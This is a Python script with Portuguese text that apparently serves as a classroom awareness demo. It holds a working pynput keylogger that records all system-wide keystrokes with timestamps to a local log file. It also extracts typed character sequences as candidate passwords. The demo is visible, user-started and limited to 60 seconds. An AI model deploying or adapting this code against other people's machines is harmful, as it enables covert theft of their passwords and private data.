#!/usr/bin/env python3
"""
Demonstração 3: Keylogger Real - Captura de Teclas
==================================================

Esta demonstração mostra como um KEYLOGGER REAL funciona,
capturando e salvando todas as teclas pressionadas em um arquivo de log.

⚠️ DESTINADO APENAS PARA FINS EDUCACIONAIS ⚠️
"""

import os
import time
import json
import threading
import sys
from datetime import datetime

# Tentar importar bibliotecas para keylogger
try:
    import pynput
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("⚠️  Biblioteca pynput não encontrada. Instale com: pip install pynput")

# Variáveis globais para keylogger
keylogger_ativo = False
teclas_capturadas = []
arquivo_log = "keylogger_log.txt"
listener = None

def mostrar_aviso():
    """Exibe aviso de segurança"""
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ⌨️  DEMONSTRAÇÃO 3: KEYLOGGER REAL ⌨️                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  Esta demonstração mostra como um KEYLOGGER REAL funciona,                  ║
║  capturando e salvando todas as teclas pressionadas em um arquivo de log.   ║
║                                                                              ║
║  ⚠️  DESTINADO APENAS PARA FINS EDUCACIONAIS ⚠️                             ║
║  ⚠️  KEYLOGGER REAL - TECLAS SERÃO CAPTURADAS ⚠️                             ║
║  ⚠️  TODAS AS TECLAS SERÃO SALVAS EM LOG.TXT ⚠️                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)

def on_key_press(key):
    """Função chamada quando uma tecla é pressionada"""
    global teclas_capturadas, keylogger_ativo
    
    if not keylogger_ativo:
        return
    
    try:
        # Converter tecla para string
        if hasattr(key, 'char') and key.char is not None:
            tecla = key.char
        elif key == keyboard.Key.space:
            tecla = " [ESPAÇO] "
        elif key == keyboard.Key.enter:
            tecla = " [ENTER] "
        elif key == keyboard.Key.tab:
            tecla = " [TAB] "
        elif key == keyboard.Key.backspace:
            tecla = " [BACKSPACE] "
        elif key == keyboard.Key.delete:
            tecla = " [DELETE] "
        elif key == keyboard.Key.esc:
            tecla = " [ESC] "
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            tecla = " [CTRL] "
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            tecla = " [ALT] "
        elif key == keyboard.Key.shift:
            tecla = " [SHIFT] "
        elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            tecla = " [CMD] "
        elif key == keyboard.Key.up:
            tecla = " [SETA_CIMA] "
        elif key == keyboard.Key.down:
            tecla = " [SETA_BAIXO] "
        elif key == keyboard.Key.left:
            tecla = " [SETA_ESQUERDA] "
        elif key == keyboard.Key.right:
            tecla = " [SETA_DIREITA] "
        elif key == keyboard.Key.f1:
            tecla = " [F1] "
        elif key == keyboard.Key.f2:
            tecla = " [F2] "
        elif key == keyboard.Key.f3:
            tecla = " [F3] "
        elif key == keyboard.Key.f4:
            tecla = " [F4] "
        elif key == keyboard.Key.f5:
            tecla = " [F5] "
        elif key == keyboard.Key.f6:
            tecla = " [F6] "
        elif key == keyboard.Key.f7:
            tecla = " [F7] "
        elif key == keyboard.Key.f8:
            tecla = " [F8] "
        elif key == keyboard.Key.f9:
            tecla = " [F9] "
        elif key == keyboard.Key.f10:
            tecla = " [F10] "
        elif key == keyboard.Key.f11:
            tecla = " [F11] "
        elif key == keyboard.Key.f12:
            tecla = " [F12] "
        else:
            tecla = f" [{str(key).replace('Key.', '')}] "
        
        # Adicionar timestamp
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]  # Milissegundos
        tecla_com_timestamp = f"[{timestamp}] {tecla}"
        
        teclas_capturadas.append(tecla_com_timestamp)
        
        # Salvar no arquivo em tempo real
        with open(arquivo_log, 'a', encoding='utf-8') as f:
            f.write(tecla_com_timestamp)
        
        # Mostrar tecla capturada (apenas algumas para não poluir)
        if len(teclas_capturadas) <= 20 or len(teclas_capturadas) % 10 == 0:
            print(f"🔍 Tecla capturada: {tecla_com_timestamp}")
        
    except Exception as e:
        print(f"❌ Erro ao capturar tecla: {e}")

def iniciar_keylogger():
    """Inicia o keylogger real"""
    global keylogger_ativo, listener, teclas_capturadas
    
    if not KEYLOGGER_AVAILABLE:
        print("❌ Keylogger não disponível - biblioteca pynput não instalada")
        print("   Para instalar: pip install pynput")
        return False
    
    print("\n⌨️  INICIANDO KEYLOGGER REAL")
    print("=" * 60)
    
    print("🔍 Iniciando captura de teclas...")
    print("   ⚠️  ATENÇÃO: Este é um KEYLOGGER REAL!")
    print("   ⚠️  Todas as teclas pressionadas serão capturadas!")
    print("   ⚠️  As teclas serão salvas em tempo real no arquivo de log!")
    
    # Limpar arquivo de log anterior
    if os.path.exists(arquivo_log):
        os.remove(arquivo_log)
    
    # Limpar lista de teclas
    teclas_capturadas = []
    
    # Adicionar cabeçalho ao arquivo
    with open(arquivo_log, 'w', encoding='utf-8') as f:
        f.write(f"KEYLOGGER LOG - DEMONSTRAÇÃO EDUCACIONAL\n")
        f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Usuário: {os.getenv('USERNAME', 'Desconhecido')}\n")
        f.write(f"Sistema: {os.name}\n")
        f.write(f"Diretório: {os.getcwd()}\n")
        f.write("=" * 50 + "\n\n")
        f.write("INÍCIO DA CAPTURA DE TECLAS:\n")
        f.write("-" * 30 + "\n\n")
    
    # Iniciar listener
    keylogger_ativo = True
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    
    print("✅ Keylogger iniciado com sucesso!")
    print(f"📄 Log salvo em: {arquivo_log}")
    print("⌨️  Pressione algumas teclas para testar...")
    print("⏰ O keylogger ficará ativo por 60 segundos...")
    
    return True

def parar_keylogger():
    """Para o keylogger"""
    global keylogger_ativo, listener
    
    if not keylogger_ativo:
        return
    
    print("\n🛑 PARANDO KEYLOGGER...")
    
    keylogger_ativo = False
    
    if listener:
        listener.stop()
        listener = None
    
    # Adicionar rodapé ao arquivo
    with open(arquivo_log, 'a', encoding='utf-8') as f:
        f.write(f"\n\nFIM DA CAPTURA DE TECLAS\n")
        f.write("-" * 30 + "\n")
        f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Total de teclas capturadas: {len(teclas_capturadas)}\n")
    
    print("✅ Keylogger parado com sucesso!")

def mostrar_estatisticas_keylogger():
    """Mostra estatísticas do keylogger"""
    global teclas_capturadas
    
    print("\n📊 ESTATÍSTICAS DO KEYLOGGER")
    print("=" * 60)
    
    if not teclas_capturadas:
        print("❌ Nenhuma tecla foi capturada")
        return
    
    total_teclas = len(teclas_capturadas)
    teclas_especiais = len([t for t in teclas_capturadas if '[' in t and ']' in t])
    teclas_normais = total_teclas - teclas_especiais
    
    print(f"📈 ESTATÍSTICAS:")
    print(f"   ⌨️  Total de teclas capturadas: {total_teclas}")
    print(f"   🔤 Teclas normais: {teclas_normais}")
    print(f"   ⚙️  Teclas especiais: {teclas_especiais}")
    print(f"   📄 Arquivo de log: {arquivo_log}")
    print(f"   📏 Tamanho do log: {os.path.getsize(arquivo_log)} bytes")
    
    # Mostrar últimas teclas capturadas
    print(f"\n🔍 ÚLTIMAS 15 TECLAS CAPTURADAS:")
    for tecla in teclas_capturadas[-15:]:
        print(f"   {tecla}")
    
    # Analisar padrões
    print(f"\n🔍 ANÁLISE DE PADRÕES:")
    
    # Contar teclas mais comuns
    teclas_count = {}
    for tecla in teclas_capturadas:
        tecla_limpa = tecla.split('] ')[1] if '] ' in tecla else tecla
        teclas_count[tecla_limpa] = teclas_count.get(tecla_limpa, 0) + 1
    
    # Ordenar por frequência
    teclas_ordenadas = sorted(teclas_count.items(), key=lambda x: x[1], reverse=True)
    
    print(f"   📊 Teclas mais pressionadas:")
    for tecla, count in teclas_ordenadas[:10]:
        print(f"      '{tecla}': {count} vezes")
    
    # Analisar sequências de teclas
    print(f"\n🔍 ANÁLISE DE SEQUÊNCIAS:")
    
    # Procurar por padrões de senha (sequências de teclas normais)
    sequencias_normais = []
    sequencia_atual = []
    
    for tecla in teclas_capturadas:
        tecla_limpa = tecla.split('] ')[1] if '] ' in tecla else tecla
        if tecla_limpa not in [' [ENTER] ', ' [TAB] ', ' [ESPAÇO] ', ' [BACKSPACE] ']:
            sequencia_atual.append(tecla_limpa)
        else:
            if len(sequencia_atual) >= 3:  # Sequências de pelo menos 3 caracteres
                sequencias_normais.append(''.join(sequencia_atual))
            sequencia_atual = []
    
    if sequencias_normais:
        print(f"   🔍 Sequências de teclas encontradas:")
        for seq in sequencias_normais[:5]:  # Mostrar apenas as primeiras 5
            print(f"      '{seq}'")
    
    print(f"\n⚠️  ESTE É UM EXEMPLO REAL DE KEYLOGGER!")
    print(f"   Em um ataque real, TODAS as suas teclas seriam capturadas!")
    print(f"   Incluindo senhas, dados bancários, mensagens pessoais...")

def demonstrar_keylogger_real():
    """Demonstra keylogger real"""
    print("\n⌨️  DEMONSTRAÇÃO DE KEYLOGGER REAL")
    print("=" * 60)
    
    if not KEYLOGGER_AVAILABLE:
        print("❌ Keylogger não disponível")
        print("   Para instalar: pip install pynput")
        return
    
    print("🔍 Esta demonstração mostra um KEYLOGGER REAL!")
    print("   Todas as teclas pressionadas serão capturadas e salvas.")
    print("   O arquivo de log será criado em tempo real.")
    
    input("\nPressione ENTER para iniciar o keylogger...")
    
    # Iniciar keylogger
    if iniciar_keylogger():
        print("\n⌨️  KEYLOGGER ATIVO - Pressione algumas teclas...")
        print("   (Digite algumas palavras, números, senhas simuladas, etc.)")
        print("   (Teste diferentes tipos de teclas: letras, números, símbolos, teclas especiais)")
        
        # Manter ativo por 60 segundos
        for i in range(60, 0, -1):
            print(f"⏰ Tempo restante: {i} segundos", end='\r')
            time.sleep(1)
        
        print("\n")
        
        # Parar keylogger
        parar_keylogger()
        
        # Mostrar estatísticas
        mostrar_estatisticas_keylogger()
        
        # Mostrar conteúdo do arquivo
        print(f"\n📄 CONTEÚDO DO ARQUIVO DE LOG:")
        print("=" * 60)
        try:
            with open(arquivo_log, 'r', encoding='utf-8') as f:
                conteudo = f.read()
                print(conteudo)
        except Exception as e:
            print(f"❌ Erro ao ler arquivo: {e}")
    
    print(f"\n⚠️  IMPACTO REAL DO KEYLOGGER:")
    print(f"   🔑 Senhas capturadas")
    print(f"   💳 Dados bancários roubados")
    print(f"   💬 Mensagens pessoais interceptadas")
    print(f"   📧 E-mails e conversas privadas")
    print(f"   🏢 Informações confidenciais do trabalho")
    print(f"   👤 Dados pessoais sensíveis")

def salvar_relatorio_keylogger():
    """Salva relatório do keylogger"""
    print("\n💾 SALVANDO RELATÓRIO DO KEYLOGGER")
    print("=" * 60)
    
    try:
        relatorio = {
            "keylogger_demonstracao": {
                "arquivo_log": arquivo_log,
                "total_teclas": len(teclas_capturadas),
                "teclas_especiais": len([t for t in teclas_capturadas if '[' in t and ']' in t]),
                "teclas_normais": len(teclas_capturadas) - len([t for t in teclas_capturadas if '[' in t and ']' in t]),
                "tamanho_log": os.path.getsize(arquivo_log) if os.path.exists(arquivo_log) else 0,
                "primeira_tecla": teclas_capturadas[0] if teclas_capturadas else "N/A",
                "ultima_tecla": teclas_capturadas[-1] if teclas_capturadas else "N/A"
            },
            "timestamp": datetime.now().isoformat(),
            "observacoes": "Demonstração educacional do Keylogger - CAPTURA REAL DE TECLAS"
        }
        
        filename = f"keylogger_demonstracao_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(relatorio, f, indent=2, ensure_ascii=False)
        
        print(f"✅ RELATÓRIO DO KEYLOGGER SALVO:")
        print(f"   📄 Arquivo: {filename}")
        print(f"   📏 Tamanho: {os.path.getsize(filename)} bytes")
        print(f"   📋 Conteúdo: Dados da captura real de teclas")
        
        return filename
        
    except Exception as e:
        print(f"❌ Erro ao salvar relatório: {e}")
        return None

def main():
    """Função principal da demonstração"""
    mostrar_aviso()
    
    print("\n⌨️  DEMONSTRAÇÃO 3: KEYLOGGER REAL")
    print("=" * 60)
    print("Esta demonstração mostra como um KEYLOGGER REAL funciona,")
    print("capturando e salvando todas as teclas pressionadas em um arquivo de log.")
    
    input("\nPressione ENTER para começar a demonstração...")
    
    # Executar demonstração de keylogger real
    demonstrar_keylogger_real()
    
    # Salvar relatório
    filename = salvar_relatorio_keylogger()
    
    print("\n" + "=" * 60)
    print("🎓 DEMONSTRAÇÃO 3 CONCLUÍDA")
    print("=" * 60)
    print("Você viu como um KEYLOGGER REAL funciona!")
    print("Todas as teclas foram capturadas e salvas em tempo real.")
    
    if filename:
        print(f"\n📄 Relatório salvo em: {filename}")
        print("   Este arquivo contém os dados da captura real de teclas!")
    
    print(f"\n⚠️  LEMBRE-SE: Em um ataque real, TODAS as suas teclas seriam capturadas!")
    print(f"   Por isso é fundamental se proteger contra keyloggers!")

if __name__ == "__main__":
    main()

